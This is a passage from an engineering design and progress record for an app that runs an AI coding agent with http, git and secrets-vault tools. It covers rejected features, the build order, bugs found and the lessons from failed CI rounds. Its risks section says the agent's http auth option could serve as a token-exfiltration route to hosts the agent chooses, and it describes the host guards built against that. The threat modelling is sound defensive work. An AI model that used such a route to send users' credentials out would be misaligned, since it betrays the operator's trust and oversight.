  `Addresses.problem`** — quietly retiring the app's "address rule first, before anything is opened" — and
  **Karate's JS has Java interop**, so an LLM inside the app that holds the vault could reach
  `Class.forName` → `Runtime.getRuntime().exec`. That is `sh` with a worse surface.

**What survives from the idea:** `.http` files are a de facto standard, so an agent may already know how to
write one. That argues for a **very small closed subset** — requests in order, named variables captured from
earlier responses, **no loops, no conditionals, no JavaScript**. A sequence that can loop is a program, and
a program needs an interpreter, and an interpreter needs a sandbox this app does not have.

**Build it only after `http` has been used, and only with evidence of what the two-call pain actually was.**
A sequence runner that hides the middle step also hides which step failed.

### 10.1b To be unambiguous: **the plan does not include a `.http` runner, and part A does not build one**

`http` takes **one request** — `method`, `url`, `headers`, `body`, `auth`. There is no `file:` key, no
`sequence:` key, and no second argument that turns it into a program. That is deliberate and it is the whole
of §3.

If a runner is ever built, the smallest honest shape is **a separate tool** (`httpseq`) with these limits,
written down now so the argument does not have to be had twice:

- **Requests in order, no branching.** `GET → POST → POST`, each answer filed to `agent/http/`.
- **Named variables from a JSON path of an earlier answer** — `{{runs[0].id}}` — and nothing else.
- **Every step through `Fetcher.request`**, so the address guard, the vault and the filing rule apply
  unchanged. **This is the one non-negotiable requirement:** a runner that opened its own sockets would
  retire `Addresses.problem` (§10.1, the Karate finding).
- **A step that fails stops the sequence, and the answer names the step and its status.** A runner that
  reported one failure for five steps would be worse than five calls.
- **No `file:` reading of a second `.http` file** — one file, one sequence, one answer.

### 10.2 Artifact upload as the agent's "stdin"

There is **no upload path in `GitHub.kt`** — `artifacts` and `artifactBytes` are both download-only. It is
tempting to add one so the agent can "post files to a workflow". **Don't.**

A file in the repo — written, committed by `write`, pushed — is visible to every job's checkout, is
versioned, and the agent already knows how. An artifact upload happens **after** the run starts, needs the
run id, goes to a different host (`pipelines.actions.githubusercontent.com`), and is invisible to the
checkout.

**The stdin is a commit.** The only file-post `http` needs is `body: "@path"`.

### 10.3 A `Ci` interface over GitHub and GitLab

It looks like the same abstraction and is not: the *model* differs (workflow file vs `.gitlab-ci.yml`), the
*trigger* differs (dispatch vs pipeline variables), the *artifact* differs, and the *secrets* differ
completely. The interface would be either so thin it saves nothing, or it would force GitLab into GitHub's
shape and lose what makes it usable. **The app is GitHub-shaped above the git layer, and `http` is how
anything else is reached.**

### 10.4 A remote config that pretends CI is portable

A config can get you **clone, push and pull against any HTTPS git host** — the genuinely portable part:

```json
{
  "name": "gitlab",
  "cloneUrl": "https://gitlab.com/{owner}/{name}.git",
  "api": "https://gitlab.com/api/v4",
  "auth": { "header": "PRIVATE-TOKEN", "secret": "gitlab-token" }
}
```

It **cannot** get you workflows, artifacts or releases. A config that pretended otherwise would be a
fiction, and the agent would write a workflow that silently never runs.

**This config is not in the five parts** — it is optional, and Part B (the `isGitHubHost` fix) delivers the
portability without it. Build the config only if a second host is actually wanted.

---

## 11. Two limits, two jobs — already built

The operator asked whether the size limit is already handled by the loop. **It is, and there are two of
them doing different work:**

| Limit | Protects | Where |
|---|---|---|
| `forConversation` (token budget) | **the context** | `AgentTools.kt:4361` — already applies to every tool |
| `LIMIT_BYTES` (100 MB) | **the process** | `Fetcher` — counted **while reading** |

**`forConversation` cannot replace `LIMIT_BYTES`:** `fetch` writes bytes to a file and never puts them in
the conversation, so `forConversation` sees a sixty-character sentence and never sees the 100 MB. A cap that
fires after the phone has buffered two gigabytes is not a cap.

**`http` adds neither.** It reuses both, in the places that already exist.

---

## 12. Order, and why that order

| # | Part | Size | Why here |
|---|---|---|---|
| **1** | **E — the refresh hook** (§7) | ~30 lines | **Smallest, most visible, fixes a live bug.** Do it first so the rest is watchable. |
| **2** | **B — `isGitHubHost` says why** (§4) | ~10 lines | **A live bug.** The guard is right; its silence is the bug. Widening it would leak the token. |
| **3** | **A — `Fetcher.request` + `http`** (§3) | ~180 lines, 12 tests | The core. Test 4 (the vault never leaks) **before the tool is reachable by a model**. |
| **4** | delete `fetch`, rename the switch (§8) | small | Follows immediately from 3. |
| ~~5~~ | ~~**C — provider config**~~ (§5) | — | **Withdrawn by the operator.** The schema as it is is good enough; git, http and secrets matter more. |
| **6** | **D — the folder rule, `replaceWithRemote` removed, `diff`, `state` removed** (§6) | ~200 lines, and **net negative** | The folder rule decides what git sees; `diff` is revisions-only because every tracked change is committed; and removing `replaceWithRemote` takes out a dialog, a `Pending`, two service methods and a test. |
| **7** | one real call by hand against the GitHub API | — | Prove the shape end to end before trusting it. |

**Parts 1 and 2 are a morning's work and each fixes something that is wrong right now.** That is deliberate:
the plan starts with the two things that are bugs, not with the two things that are features.

### 12.1 What was built, and what reality contradicted

**Parts 1, 2, 3 and 3b are done and green.** Written down here because the plan is a record of what happened
rather than of what was intended.

| # | Built | The plan was wrong about |
|---|---|---|
| **1** | `f46ab74` — the refresh hook | Nothing. ~30 lines as estimated. |
| **2** | `56a030c`, `d951ac8` — the host guard | **The proposed fix was wrong.** Widening `isGitHubHost` to "a host we hold a token for" would send a GitHub token to `gitlab.com`, because `tokenKey(login)` is one token per login and the login comes from GitHub's `/user`. The guard was right; its silence was the bug. **A real leak was found while checking:** `pushNow` had no guard at all and attached the key to whatever `origin` said. |
| **3** | `78b45a6`, `8bd4694`, `cc49c00` — `Fetcher.request` + `http` | The size estimate held (~180 lines + ~20 tests). Two Kotlin facts cost a round each: the schema is built **from the example**, so an example naming three of five arguments leaves two the model cannot know about; and `AgentLog`'s constructor is private, so a test builds one with `open`. |
| **3b** | `99ad20c`, `62a0e0f`, `2a68d33` — `secret(name, host)` + the screen | **The host binding had to be two-way**, which the plan did not anticipate: `AgentTools` reads `MUFFY_LOG_KEY` to decrypt a CI log, and that key is never sent anywhere. Special-casing the caller would have been wrong; an empty host now means "travels nowhere" and the two kinds cannot be confused in either direction. **Also found: the vault had no door at all** — `setSecret` was called by nothing outside tests. |

### 12.2 Part 4 and Part D, and the six rounds they cost

**Both are done.** Part 4 deleted `fetch`; Part D built the folder rule, `git {op: diff}`, and removed
`replaceWithRemote` and `state`.

| # | Built | The plan was wrong about |
|---|---|---|
| **4** | `b3b1678` — `fetch` deleted | **The plan said `fetch` was "`http` with GET and a fixed folder". It was not.** `fetch` listed what is inside a downloaded zip, and `http` had no equivalent — so deleting it would have quietly lost the answer to "which files did this dependency tarball produce". `archiveListing` moved into `http` first. **Also: `fetchAllowed` could not simply be renamed** — the stored pref key `KEY_FETCH` is on every phone, and renaming it would silently turn the switch back **on** for anyone who had it off. A security setting that resets itself is worse than a name that reads oddly, so `keepHttp` writes `KEY_FETCH`. |
| **D** | `31c06da`, `a489a20`, `8be8957`, `6cd1876`, `09335bf`, `7caffe9` | **`shouldIgnoreOnCreate = kindOf != TEXT` is wider than the plan's own table said**, and I had the direction backwards at first: the rule was `== UNKNOWN`, and `EntryKind` has a separate `IMAGE`, so **pictures were born tracked** — which is *why* `LFS_ATTRIBUTE` is a list of image extensions. **And `FOLDER != TEXT` is true**, so the one-line form ignored every folder a person made and `createFolder` refused, taking a whole screen's behaviour with it. **`GitService.Changes` was already taken**, so the new data class shadowed it: fine in one file, broken everywhere both were in scope. **`NullOutputStream()` does not compile** — the class has a private constructor and is exposed as `INSTANCE`. |

**Six CI rounds, and every one was a Kotlin fact QC cannot see.** QC does not type-check; the compiler
is the only checker and CI is the only compiler. Four of the six would have been caught by reading the
declaration rather than the call site:

1. `commit()` returns `String?`, not an object with `.id`.
2. `NullOutputStream` has a private constructor — `INSTANCE`.
3. `GitService.Changes` already exists; mine shadowed it.
4. Four test files still called `replaceWithRemote` after it was deleted.

**The lesson is narrower than "be careful".** The pattern is: *a symbol whose shape I assumed rather than
read*. Each of these was one grep away — `fun commit(`, `data class Changes`, the jar's field list — and
none was found by reading my own new code.

**Three CI rounds were spent on test defects rather than product defects**, and each is worth remembering:

1. `hostOf("file:///tmp/x")` answered `file` — a scheme with no authority is not a host. Every signing test
   failed on it, because the test GitHub on disk clones from a `file:` URL.
2. `MemoryCredentials` inherited the interface's `null` for `secretHost`, so a refusal that should have named
   `api.github.com` said "this phone only" — the fake could not produce the sentence the test asserted.
3. A scrollable `Column` inside an `AlertDialog` never reports idle in Robolectric, so every test that typed
   into a field waited sixty seconds and the suite ran out of memory.

**The lesson in all three:** a fake that inherits a default is a fake that agrees with nothing, and a test that
asserts a sentence is only as good as the fake's ability to produce it.

---

## 13. Risks and open questions

- **`http` is the first tool that can write to a foreign system on the agent's own initiative.** `push` was
  the only outward act before. The refusals in §3.3 are the guard, and test 4 is the one that must never be
  deleted.
- **The vault cannot bind a secret to a host yet** (§3.3b). Until it does, `auth:` is a token-exfiltration
  primitive: the agent names the secret, the app resolves it, and it goes to a host of the agent's choosing.
- **`git checkout` on a phone is untested.** It can rewrite hundreds of files, and this app has no undo
  beyond history. It may need a confirmation rule that `revert` does not.
- **The `git` tool's closed set will be argued with.** Every `op` not in the list becomes a request. The
  answer is that `http` cannot help here, so the list grows deliberately or not at all.
- **`push`/`pull` have still never run against a real GitHub remote** — the offline suite only. That
  predates this plan and this plan does not fix it.
- **A hang, OOM kill or cancelled CI run still emits no readable log or artifact.** Known, accepted cost.

---

## 14. What this does not solve

- **CI portability.** §1's missing quarter. `http` makes providers reachable, never interchangeable.
- **Secrets stay app-only.** `http` reads the vault; it cannot write one. A `PUT` to a secrets endpoint
  could overwrite the keystore and silently break releases, and nothing would report it.
- **Repo creation and deletion stay app-only.** `DELETE /repos/…` has no undo.
- **`browse` and `shot` still need the device's WebView.** A phone that has not updated WebView renders an
  old engine, and no config file changes that.
- **The model layer stays OpenAI-shaped.** A provider that does not speak `chat/completions` needs a parser,
  not a config.
